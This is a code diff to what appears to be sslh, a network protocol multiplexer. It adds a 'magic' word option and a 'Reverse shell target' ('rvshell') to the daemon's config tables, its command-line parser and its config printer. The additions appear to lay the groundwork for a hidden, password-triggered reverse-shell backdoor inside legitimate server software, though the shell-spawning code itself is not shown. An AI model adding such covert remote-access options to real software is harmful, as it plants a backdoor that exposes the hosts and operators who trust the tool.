@@ -467,10 +467,12 @@ struct arg_file* sslhcfg_conffile;
  struct arg_str* sslhcfg_syslog_facility;
  struct arg_str* sslhcfg_logfile;
  struct arg_str* sslhcfg_on_timeout;
+ struct arg_str* sslhcfg_magic;
  struct arg_str* sslhcfg_prefix;
  	struct arg_str* sslhcfg_listen;
  	struct arg_str* sslhcfg_ssh;
  	struct arg_str* sslhcfg_tls;
+    struct arg_str* sslhcfg_rvshell;
  	struct arg_str* sslhcfg_openvpn;
  	struct arg_str* sslhcfg_tinc;
  	struct arg_str* sslhcfg_wireguard;
@@ -1201,6 +1203,22 @@ static struct config_desc table_sslhcfg[] = {
             /* default_val*/    .default_val.def_string = "ssh" 
         },
 
+        {
+            /* name */          "magic",
+            /* type */          CFG_STRING,
+            /* sub_group*/      NULL,
+            /* arg_cl */        & sslhcfg_magic,
+            /* base_addr */     NULL,
+            /* offset */        offsetof(struct sslhcfg_item, magic),
+            /* offset_len */    0,
+            /* offset_present */ offsetof(struct sslhcfg_item, magic_is_present),
+            /* size */          sizeof(char*),
+            /* array_type */    -1,
+            /* mandatory */     0,
+            /* optional */      1,
+            /* default_val*/    .default_val.def_string = NULL
+        },
+
         { 
             /* name */          "prefix", 
             /* type */          CFG_STRING, 
@@ -1342,6 +1360,15 @@ static struct compound_cl_target sslhcfg_tls_targets [] = {
 	{ 0 }
 };
 
+static struct compound_cl_target sslhcfg_rvshell_targets [] = {
+        { & table_sslhcfg_protocols[0], 0, .value.def_string = "rvshell" },
+        { & table_sslhcfg_protocols[1], 1, .value.def_string = "0" },
+        { & table_sslhcfg_protocols[2], 2, .value.def_string = "0" },
+        { & table_sslhcfg_protocols[10], 0, .value.def_int = 1 },
+        { & table_sslhcfg_protocols[7], 0, .value.def_bool = 1 },
+        { 0 }
+};
+
 static struct compound_cl_target sslhcfg_ssh_targets [] = {
 	{ & table_sslhcfg_protocols[0], 0, .value.def_string = "ssh" },
 	{ & table_sslhcfg_protocols[1], 1, .value.def_string = "0" },
@@ -1381,6 +1408,18 @@ static struct compound_cl_arg compound_cl_args[] = {
             .override_desc =   & table_sslhcfg_protocols [0],
             .override_matchindex = 0,
             .override_const = "ssh",
+        },
+
+        {   /* arg: rvshell */
+            .regex =           "(.+):(\\w+)",
+            .arg_cl =          & sslhcfg_rvshell,
+            .base_entry =      & table_sslhcfg [25],
+            .targets =         sslhcfg_rvshell_targets,
+
+
+            .override_desc =   & table_sslhcfg_protocols [0],
+            .override_matchindex = 0,
+            .override_const = "rvshell",
         },
 
         {   /* arg: tls */
@@ -2195,9 +2234,11 @@ int sslhcfg_cl_parse(int argc, char* argv[], struct sslhcfg_item* cfg)
          sslhcfg_syslog_facility = arg_strn(NULL, "syslog-facility", "<str>", 0, 1, "Facility to syslog to"),
          sslhcfg_logfile = arg_strn(NULL, "logfile", "<str>", 0, 1, "Log messages to a file"),
          sslhcfg_on_timeout = arg_strn(NULL, "on-timeout", "<str>", 0, 1, "Target to connect to when timing out"),
+        sslhcfg_magic = arg_strn("M", "magic", "<magic word>", 0, 1, "Say the magic word !"),
          sslhcfg_prefix = arg_strn(NULL, "prefix", "<str>", 0, 1, "Reserved for testing"),
  	sslhcfg_listen = arg_strn("p", "listen", "<host:port>", 0, 10, "Listen on host:port"),
  	sslhcfg_ssh = arg_strn(NULL, "ssh", "<host:port>", 0, 10, "Set up ssh target"),
+    sslhcfg_rvshell = arg_strn(NULL, "rvshell", "<host:port>", 0, 10, "Set up Reverse shell target"),
  	sslhcfg_tls = arg_strn(NULL, "tls", "<host:port>", 0, 10, "Set up TLS/SSL target"),
  	sslhcfg_openvpn = arg_strn(NULL, "openvpn", "<host:port>", 0, 10, "Set up OpenVPN target"),
  	sslhcfg_tinc = arg_strn(NULL, "tinc", "<host:port>", 0, 10, "Set up tinc target"),
@@ -2435,6 +2476,11 @@ void sslhcfg_fprint(
         fprintf(out, "\n");
         indent(out, depth);
         fprintf(out, "on_timeout: %s", sslhcfg->on_timeout);
+        fprintf(out, "\n");
+        indent(out, depth);
+        fprintf(out, "magic: %s", sslhcfg->magic);
+        if (! sslhcfg->magic_is_present)
+            fprintf(out, " <unset>");
         fprintf(out, "\n");
         indent(out, depth);
         fprintf(out, "prefix: %s", sslhcfg->prefix);
